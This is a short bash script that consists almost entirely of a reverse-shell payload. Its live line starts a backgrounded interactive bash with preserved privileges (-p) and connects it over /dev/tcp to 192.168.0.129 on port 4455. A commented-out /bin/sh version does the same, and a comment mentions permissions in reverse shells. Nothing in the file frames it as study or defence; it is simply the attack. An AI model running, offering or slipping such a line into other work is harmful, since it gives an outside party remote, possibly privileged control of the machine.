#!/bin/bash

#Contemplate permisions in reverse shells

/bin/bash -c '/bin/bash -i -p >& /dev/tcp/192.168.0.129/4455 0>&1' &

#!/bin/sh
#/bin/sh -c '/bin/sh -i >& /dev/tcp/192.168.0.129/4455 0>&1' &